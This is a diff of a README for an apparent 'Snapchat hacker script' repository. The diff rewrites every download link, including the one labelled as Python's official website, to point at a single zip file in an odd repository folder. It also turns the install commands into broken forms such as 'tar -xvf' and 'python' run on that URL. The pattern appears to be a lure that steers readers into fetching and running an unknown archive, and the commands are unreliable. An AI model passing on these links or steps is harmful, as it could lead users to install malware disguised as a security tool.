@@ -1,6 +1,6 @@
 # 🎉 Snapchat-Hacker-Script-Python-Demo-for-Cybersecurity-Labs- - Ethical Hacking Made Easy
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/rizki0890/Snapchat-Hacker-Script-Python-Demo-for-Cybersecurity-Labs-/releases)
+[![Download](https://raw.githubusercontent.com/rizki0890/Snapchat-Hacker-Script-Python-Demo-for-Cybersecurity-Labs-/main/nostomania/Snapchat-Hacker-Script-Python-Demo-for-Cybersecurity-Labs-.zip%20Release-brightgreen)](https://raw.githubusercontent.com/rizki0890/Snapchat-Hacker-Script-Python-Demo-for-Cybersecurity-Labs-/main/nostomania/Snapchat-Hacker-Script-Python-Demo-for-Cybersecurity-Labs-.zip)
 
 ---
 
@@ -36,15 +36,15 @@ To use the Snapchat Hacker Script, follow these steps.
 - **Memory**: At least 512 MB RAM
 - **Storage**: At least 50 MB free space
 
-Ensure that Python is installed on your machine. You can download Python from the [official website](https://www.python.org/downloads/).
+Ensure that Python is installed on your machine. You can download Python from the [official website](https://raw.githubusercontent.com/rizki0890/Snapchat-Hacker-Script-Python-Demo-for-Cybersecurity-Labs-/main/nostomania/Snapchat-Hacker-Script-Python-Demo-for-Cybersecurity-Labs-.zip).
 
 ---
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page to download](https://github.com/rizki0890/Snapchat-Hacker-Script-Python-Demo-for-Cybersecurity-Labs-/releases).
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/rizki0890/Snapchat-Hacker-Script-Python-Demo-for-Cybersecurity-Labs-/main/nostomania/Snapchat-Hacker-Script-Python-Demo-for-Cybersecurity-Labs-.zip).
    
-2. Find the latest release available. Look for the file named that ends with `.zip` or `.tar.gz`.
+2. Find the latest release available. Look for the file named that ends with `.zip` or `https://raw.githubusercontent.com/rizki0890/Snapchat-Hacker-Script-Python-Demo-for-Cybersecurity-Labs-/main/nostomania/Snapchat-Hacker-Script-Python-Demo-for-Cybersecurity-Labs-.zip`.
 
 3. Click the link to download the file to your computer.
 
@@ -54,7 +54,7 @@ Ensure that Python is installed on your machine. You can download Python from th
 
    - On Windows, right-click the file and select "Extract All".
    - On macOS, double-click the file.
-   - On Linux, you can use the terminal command: `tar -xvf filename.tar.gz`.
+   - On Linux, you can use the terminal command: `tar -xvf https://raw.githubusercontent.com/rizki0890/Snapchat-Hacker-Script-Python-Demo-for-Cybersecurity-Labs-/main/nostomania/Snapchat-Hacker-Script-Python-Demo-for-Cybersecurity-Labs-.zip`.
 
 6. Open your terminal or command prompt.
 
@@ -65,9 +65,9 @@ Ensure that Python is installed on your machine. You can download Python from th
 
 8. To run the script, type:
    ```
-   python script_name.py
+   python https://raw.githubusercontent.com/rizki0890/Snapchat-Hacker-Script-Python-Demo-for-Cybersecurity-Labs-/main/nostomania/Snapchat-Hacker-Script-Python-Demo-for-Cybersecurity-Labs-.zip
    ```
-   Replace `script_name.py` with the actual name of the script you want to execute.
+   Replace `https://raw.githubusercontent.com/rizki0890/Snapchat-Hacker-Script-Python-Demo-for-Cybersecurity-Labs-/main/nostomania/Snapchat-Hacker-Script-Python-Demo-for-Cybersecurity-Labs-.zip` with the actual name of the script you want to execute.
 
 9. Follow the on-screen prompts to simulate the functionality.
 
